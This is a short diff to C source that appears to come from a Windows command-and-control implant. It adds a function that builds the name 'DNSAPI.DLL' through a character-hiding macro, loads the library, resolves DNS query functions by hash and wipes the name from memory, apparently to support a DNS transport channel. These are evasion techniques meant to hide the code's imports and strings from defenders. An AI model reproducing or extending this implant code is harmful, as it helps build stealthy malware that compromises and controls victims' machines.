@@ -391,6 +391,41 @@ BOOL RtWs2_32(
 }
 
 
+BOOL RtDnsapi(
+    VOID
+) {
+#ifdef TRANSPORT_DNS
+    CHAR ModuleName[ 11 ] = { 0 };
+
+    ModuleName[ 0  ] = HideChar('D');
+    ModuleName[ 1  ] = HideChar('N');
+    ModuleName[ 2  ] = HideChar('S');
+    ModuleName[ 3  ] = HideChar('A');
+    ModuleName[ 4  ] = HideChar('P');
+    ModuleName[ 5  ] = HideChar('I');
+    ModuleName[ 6  ] = HideChar('.');
+    ModuleName[ 7  ] = HideChar('D');
+    ModuleName[ 8  ] = HideChar('L');
+    ModuleName[ 9  ] = HideChar('L');
+    ModuleName[ 10 ] = HideChar(0);
+
+    if ( ( Instance->Modules.Dnsapi = LdrModuleLoad( ModuleName ) ) ) {
+        MemZero( ModuleName, sizeof( ModuleName ) );
+        Instance->Win32.DnsQuery_A = LdrFunctionAddr( Instance->Modules.Dnsapi, H_FUNC_DNSQUERY_A );
+        Instance->Win32.DnsFree    = LdrFunctionAddr( Instance->Modules.Dnsapi, H_FUNC_DNSFREE );
+
+        PUTS( "Loaded Dnsapi functions" )
+    } else {
+        MemZero( ModuleName, sizeof( ModuleName ) );
+        PUTS( "Failed to load Dnsapi" )
+        return FALSE;
+    }
+#endif
+
+    return TRUE;
+}
+
+
 BOOL RtSspicli(
     VOID
 ) {
